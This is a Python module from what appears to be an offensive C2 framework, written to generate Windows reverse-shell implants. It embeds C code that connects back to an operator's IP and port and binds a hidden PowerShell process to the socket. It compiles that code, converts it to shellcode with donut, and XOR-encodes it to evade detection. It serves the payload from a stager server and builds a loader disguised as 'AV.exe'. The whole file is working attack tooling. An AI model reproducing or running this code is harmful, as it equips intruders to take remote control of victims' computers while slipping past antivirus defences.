import base64
import os
import tempfile
import subprocess
import shutil
from pathlib import Path
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.payload_utils import XorEncode
from core.payload_generator.windows.tcp.exe import build_make
from core import stager_server as stage
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

xor = payutils.XorEncode()


def make_raw(ip, port):
	payload = f"""

#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)\"{ip}\"
# define CLIENT_PORT (int){port}
#endif


int main(void) {{
	if (strcmp(CLIENT_IP, \"0.0.0.0\") == 0 || CLIENT_PORT == 0) {{
		write(2, \"[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\", 50);
		return (1);
	}}

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {{
		write(2, \"[ERROR] WSASturtup failed.\", 27);
		return (1);
	}}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {{
		Sleep(5000);
	}}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {{
		write(2, \"[ERROR] connect failed.\", 24);
		return (1);
	}}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, \"powershell.exe\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}}
"""

	return payload


def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
	raw = make_raw(ip, port)

	# 2) write to temp .c file
	fd, c_path = tempfile.mkstemp(suffix=".c", text=True)
	try:
		with os.fdopen(fd, "w") as f:
			f.write(raw)
		
		# 3) compile with Mingw‑w64 as x86_64 Windows exe
		exe_path = c_path[:-2] + ".exe"
		gcc = shutil.which("x86_64-w64-mingw32-gcc") or "x86_64-w64-mingw32-gcc"
		cmd = [
			gcc,
			"-static",
			"-O2",
			c_path,
			"-o", exe_path,                
			"-lws2_32",
			"-m64",
		]
		#print(f"[+] Compiling payload: {' '.join(cmd)}")
		subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		# 4) run donut to produce shellcode blob (format=raw)
		sc_path = c_path[:-2] + ".bin"
		donut = shutil.which("donut")
		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
		donut_cmd = [donut, "-f", "3", "-a", "2", "-o", sc_path, "-i", exe_path]
		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
		subprocess.run(donut_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		# 5) read the shellcode blob into memory
		try:
			with open(sc_path, "rb") as f:
				shellcode = f.read()

		except Exception as e:
			print(f"ERROR: {e}")

		shellcode = shellcode.replace(b"unsigned char buf[] =", b"")

		with open(sc_path, "wb") as f:
			f.write(shellcode)
		
		"""with open(sc_path, "rb") as f:
			donut_file = f.read()

		with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
			f.write(donut_file)"""

		# 6) XOR‑encode it using our XorEncode helper
		encoder = XorEncode()
		#encoder.shellcode = bytearray(shellcode)
		length = len(shellcode)
		#print("AFTER length")

		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)

		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
		out = Path.cwd() / "AV.exe"
		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
		print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
		build_status = build_make.build(out, payload, stager_ip, stager_port)
		if build_status:
			return True

	finally:
		# clean up temp files
		for p in (c_path, exe_path, sc_path):
			try:
				os.remove(p)

			except OSError:
				pass

